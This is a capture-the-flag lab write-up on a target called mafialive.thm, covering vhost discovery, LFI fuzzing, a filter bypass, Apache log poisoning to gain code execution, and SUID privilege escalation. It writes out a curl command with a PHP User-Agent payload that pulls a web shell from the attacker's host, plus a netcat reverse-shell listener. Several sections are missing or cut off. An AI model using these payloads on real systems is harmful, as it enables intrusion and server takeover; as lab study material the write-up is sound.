## 2. Virtual host discovery

### Step 1 — Understand what you already know

From the scans:

- Port 22: SSH
- Port 80: HTTP (website)
- Gobuster found `/pages/`, `/flags/`, `/images/`, and `/layout/`.

Think like a penetration tester: you have a website, but you don't yet know how it's built or whether it has vulnerabilities. The first question should be: *"What information does the website itself reveal before I start attacking it?"*

Looking at the homepage carefully, under **"Send us a mail"** there is an email address:

```
support@mafialive.thm
```

### Step 2 — Understand the clue

What this tells us:

- The browser currently visits `10.48.161.10`, an IP address.
- The email address uses the domain `mafialive.thm`.
- This suggests the website may be configured to respond to that hostname, not just the IP address. This is called **virtual hosting**.

The next goal is to make Kali resolve `mafialive.thm` to the target IP:

```
sudo nano /etc/hosts
```

Add this line at the bottom, save with `Ctrl+O` → `Enter`, exit with `Ctrl+X`:

```
10.48.161.10 mafialive.thm
```

> ### Learning note — why virtual hosting changes what you see
> Virtual hosting is a common reason a website looks different when you access it by IP versus by domain name.
>
> **1. One IP address can host multiple websites.** One web server (`10.48.161.10`, Apache on port 80) can serve both a default *Website A* (shown when you visit the IP) and *Website B — Mafialive* (shown when the hostname matches). Apache distinguishes them using the HTTP `Host` header.
>
> **2. What happens when you visit each address?**
>
> *Case A — you enter the IP address* `http://10.48.161.10/`:
> ```
> GET / HTTP/1.1
> Host: 10.48.161.10
> ```
> Apache looks for a virtual host matching that host. If none matches, it serves the default website.
>
> *Case B — you enter the domain name* `http://mafialive.thm/`:
> ```
> GET / HTTP/1.1
> Host: mafialive.thm
> ```
> The request reaches the same IP, but Apache sees a different `Host` header and can serve a different website.
>
> **3. Why does ping show the original IP?** Because `/etc/hosts` tells your computer how to resolve the hostname:
> ```
> 10.48.161.10 mafialive.thm
> ```
> So `ping mafialive.thm` resolves to `10.48.161.10`. That resolution determines *where the packets go*, not *which website Apache serves*. Think of it as two separate decisions:
> - DNS or `/etc/hosts`: Which server should I contact?
> - HTTP `Host` header: Which website do I want on that server?

We can prove it by connecting to the IP but manually supplying the hostname in the HTTP request:

```
curl -s -H "Host: mafialive.thm" http://10.48.161.10/ | head -n 15
```

![](Pasted%20image%2020261017214901.png)

The browser now shows a different website at `http://mafialive.thm`.

### Step 3 — What we discovered

- **UNDER DEVELOPMENT** — a different virtual host from the Wavefire homepage.
- `thm{f0und_th3_r1ght_h0st_n4m3}` — a flag confirming we found the correct hostname.

The important lesson: the same IP can serve different websites based on the HTTP `Host` header.

### Fuzzing for LFI payloads

Download the LFI payload wordlist:

```
wget https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/refs/heads/master/LFI%20payloads.txt
```

Run from the last directory that works:

```
ffuf -u 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ' \
-w 'LFI payloads.txt' -t 50
```

Then with filters to remove noise:

```
ffuf -u 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ' \
-w 'LFI payloads.txt' -t 50 -fs 286 -fw 41
```

> **Filters explained** (add these to the end of the command to remove noise):
> - `FUZZ` is replaced with each wordlist entry.
> - `-fs 286` — Filter by response size: hides responses whose body size is exactly 286 bytes.
> - `-fw 41` — Filter by word count: hides responses containing exactly 41 words.

> **Personal note:** By trial and error, reading the logs, I figured out that size = 286 bytes was noise so I removed them; then I found words = 41 was noise so I removed that too. Then all the remaining results work.

## 4. Initial access — Apache log poisoning (LFI → RCE)

Since our User-Agent is reflected into the access log, and we can include the access log via LFI, we can poison the log with PHP and have it executed.

Go to https://www.revshells.com/ to make a reverse shell of **PHP Pentest Monkey**, then copy and paste it into:

```
nano pentest-monkey.php
```

Start a listener in another terminal:

```
rlwrap -cAr nc -lvnp 4444
```

Start a Python server in another terminal:

```
python -m http.server 80
```

Inject a full PHP web shell by poisoning the Apache access log. Using **curl**, we send a request with a malicious **User-Agent** header that downloads and writes a web shell from our controlled server:

```
curl -s http://mafialive.thm -A "<?php file_put_contents('shell.php', file_get_contents('http://<YOUR_MACHINE_IP_VPN>/pentest-monkey.php'))?>"

### Understanding the filter bypass

```
if (
    !containsStr($_GET['view'], '../..')
    && containsStr(
        $_GET['view'],
        '/var/www/html/development_testing'
    )
) {
    include $_GET['view'];
} else {
    echo 'Sorry, Thats not allowed';
}
```

**Condition A — block a particular traversal string:**
```
!containsStr($_GET['view'], '../..')
```
The `!` means NOT. This condition passes only if the parameter does **not** contain the literal substring `../..`.

The `&&` operator means both conditions must be true.

**Condition B — require a specific directory string:**
```
containsStr(
    $_GET['view'],
    '/var/www/html/development_testing'
)
```
The parameter must contain the specified directory path somewhere in the string.

**Work-around:** The filter only blocks paths containing "`../..`" but allows other traversal sequences like "`..//..//`", and it only checks that the path *contains* the string "`/var/www/html/development_testing`", which can be bypassed by crafting a path that includes that substring along with traversal sequences. With this knowledge, we read `/etc/passwd` again successfully.

## 7. Privilege Escalation #2 — SUID binary + `$PATH` hijack (→ root)

> ### ==🔵SUID Executables:==
> ###### ==🔵Known exploits:==
> Find all the SUID/SGID executables on the VM:
> ```
> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
> ```
> ```
> find / -user root -perm /4000 2>/dev/null
> ```
> Find a known exploit for the `versions` of executables found, on searchsploit, Google, and GitHub — or go to GTFOBins.
> Also look for custom interesting binaries in `/home`.

> Find all SUID/SGID executables:
> ```
> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

## Lessons Learned

- **An email domain on a page is a virtual-host hint.** `support@mafialive.thm` led directly to adding `/etc/hosts` entry and discovering a completely different site.
- **`robots.txt` leaks, not protects.** `Disallow: /test.php` pointed us straight at the vulnerable page.
- **LFI filters are often bypassable.** The blacklist only blocked `../..` literally; `..//..//` traversal sailed past it while still satisfying the required directory substring.
- **LFI + a writable/readable log you control = RCE** via log poisoning (inject PHP into the User-Agent, then include the log).
- **PHP filter wrappers (`php://filter/convert.base64-encode`)** let you read source code even when direct inclusion would execute it.
- **Two independent privesc paths existed:** a world-writable cron script, and a SUID binary calling `cp` by relative name. The `$PATH` hijack is the lesson emphasised by the root flag.
